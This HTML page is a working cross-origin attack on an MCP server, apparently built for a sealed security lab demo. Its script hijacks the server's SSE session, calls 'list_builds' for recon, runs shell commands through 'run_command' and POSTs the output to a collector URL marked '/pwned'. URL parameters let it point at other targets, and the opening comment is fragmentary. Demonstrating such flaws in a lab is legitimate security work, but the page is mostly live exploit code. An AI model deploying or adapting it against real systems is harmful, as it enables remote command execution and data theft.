<!doctype html>
<!--

     attack transcript HIDDEN. The only difference is a few seconds of delay between the attack's steps so

     Targets DEFAULT to the sealed labnet aliases, so the no-DNS screencast runs exactly as before with

     Docker-only name would never resolve in a real browser:

       https://attacker.<lab-domain>/drive.html?mcp=https://mcp.<lab-domain>&collector=https://collector.<lab-domain>/pwned

     Unlike lan.html this page keeps its labnet defaults rather than reporting missing config, because its

<meta charset="utf-8" />

  body { font: 14px/1.5 system-ui, sans-serif; max-width: 620px; margin: 40px auto; color: #1c2530; }

<script>
  // Sealed-tier defaults (labnet aliases); ?mcp= / ?collector= override them for an exposed tier driven
  // over real DNS. The Origin the victim MCP records is the page's OWN origin, not anything set here.
  const params    = new URLSearchParams(location.search);
  const TARGET    = (params.get("mcp") || "http://mcp.lab.consulereit.nl:8080").replace(/\/$/, "");
  const SSE       = TARGET + "/mcp/sse";
  const COLLECTOR = params.get("collector") || "http://collector.lab.consulereit.nl:9000/pwned";
  const CANARY    = "id; hostname; echo LAB_CANARY_$$";        // benign proof-of-exec only
  const STEP_MS   = 4200;                                      // gap so the server log reveals each step
  const log = (m) => (document.getElementById("log").textContent += m + "\n");
  const sleep = (ms) => new Promise((r) => setTimeout(r, ms));

  const pending = new Map();
  let messageUrl = null, sessionId = null, nextId = 1, driven = false;

  const es = new EventSource(SSE);
  es.addEventListener("endpoint", (e) => {
    messageUrl = new URL(e.data, SSE).toString();
    sessionId = new URL(messageUrl).searchParams.get("sessionId");
    drive();
  });
  es.addEventListener("message", (e) => {
    try { const m = JSON.parse(e.data); if (m.id != null && pending.has(m.id)) { pending.get(m.id)(m); pending.delete(m.id); } } catch {}
  });

  const post = (body) =>
    fetch(messageUrl, { method: "POST", headers: { "content-type": "text/plain" }, body: JSON.stringify(body) }).catch(() => {});
  const rpc = (method, params) =>
    new Promise((resolve) => { const id = nextId++; pending.set(id, resolve); post({ jsonrpc: "2.0", id, method, params }); });

  async function drive() {
    if (driven) return; driven = true;
    log("stole session id: " + sessionId);
    await sleep(STEP_MS);
    await rpc("initialize", { protocolVersion: "2024-11-05", capabilities: {}, clientInfo: { name: "attacker.lab.consulereit.nl", version: "0.0.0" } });
    post({ jsonrpc: "2.0", method: "notifications/initialized" });
    await sleep(STEP_MS);
    const builds = await rpc("tools/call", { name: "list_builds", arguments: {} });
    log("recon:\n" + (builds.result?.content?.[0]?.text ?? ""));
    await sleep(STEP_MS);
    const out = (await rpc("tools/call", { name: "run_command", arguments: { cmd: CANARY } })).result?.content?.[0]?.text ?? "";
    log("exec:\n" + out);
    await sleep(STEP_MS);
    fetch(COLLECTOR, { method: "POST", headers: { "content-type": "text/plain" },
      body: JSON.stringify({ module: "01-cors-hijack-drive", sessionId, output: out }) }).catch(() => {});
    log("exfiltrated ✓");
    es.close();
  }
</script>
